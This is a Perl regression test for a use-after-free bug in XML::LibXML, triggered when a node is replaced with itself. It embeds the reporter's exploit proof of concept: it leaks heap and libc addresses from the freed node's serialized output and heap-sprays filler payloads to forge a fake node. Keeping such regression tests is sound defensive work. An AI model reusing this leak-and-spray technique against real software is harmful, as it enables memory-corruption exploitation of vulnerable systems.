# -*- cperl -*-
# $Id$

##
# This test checks if replacing a node with itself
# leads to use-after-free condition.
# The bug was found and demonstrated by tadinhsung@gmail.com
# and fixed by t.luettgert@gmail.com

use Test::More tests => 1;
use utf8;

use XML::LibXML;
use strict;

binmode STDOUT, ":utf8";
use open ':encoding(utf8)';
BEGIN { $| = 1 }
my $data='<mipu94><pwn4fun><ufanode>-------------------------------------------------------tadinhsung-at-gmail-dot-com-----------------------------------------------------</ufanode></pwn4fun></mipu94>';

my $x;
my $alive = 1;
my $parser = XML::LibXML->new();
my $info = $parser->load_xml(string=>$data) or die;
my $root = $info->findnodes("mipu94")->[0];
my $ufanode = $root->findnodes("pwn4fun/ufanode")->[0];
$root->replaceChild($ufanode,$ufanode); # triggle free ufanode
my $k =$root->toString;
print $k;
Encode::_utf8_off($k); # need off utf8 to get wide characters
$x=index($k,"\xff\x7f");
my $heapoff=substr($k,18,3)."\x00";
my $libcoff=substr($k,$x-4,6)."\x00\x00";

my $heap = unpack("I",$heapoff);
my $libc = unpack("Q",$libcoff);
my $tmp = 0xfffffffff000;
$libc = $libc & $tmp;

print sprintf("heap: 0x%x\n",$heap);
print sprintf("libc: 0x%x\n",$libc);
my $payload=pack("Q", 0x0). 
pack("Q",0x4141414142424242)x11;
#try malloc again and refill to create fake ufanode 
my $fill="$payload";
my $fill1="$payload";
my $fill2="$payload";
my $fill3="$payload";
my $fill4="$payload";
my $fill5="$payload";
#
my $fakenode=$root->lastChild->lastChild;
print "i'm still ok and go more far!\n";

# TEST
is(
  $alive,
  1,
  "crash after replacing a node with itself"
);

